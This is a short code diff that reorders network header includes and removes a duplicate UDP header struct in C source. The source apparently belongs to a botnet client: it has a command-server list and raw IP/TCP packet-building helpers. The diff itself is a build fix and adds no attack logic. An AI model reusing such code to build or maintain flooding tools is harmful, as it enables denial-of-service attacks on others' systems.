@@ -35,10 +35,7 @@
 #include <netdb.h>
 #include <netinet/if_ether.h>
 #include <netinet/igmp.h>
-#include <netinet/in.h>
-#include <netinet/ip.h>
-#include <netinet/tcp.h>
-#include <netinet/udp.h>
+
 
 #include <pthread.h>
 #include <signal.h>
@@ -56,6 +53,10 @@
 #include <unistd.h>
 
 #define __FAVOR_BSD
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
 #define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
 
 
@@ -817,17 +818,7 @@ unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
         free(tcp);
         return output;
 }
- #ifndef __UDPHDR_DEFINED
-#define __UDPHDR_DEFINED
 
-struct udphdr {
-    uint16_t source;
-    uint16_t dest;
-    uint16_t len;
-    uint16_t check;
-};
-
-#endif
 void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
 {
         iph->ihl = 5;
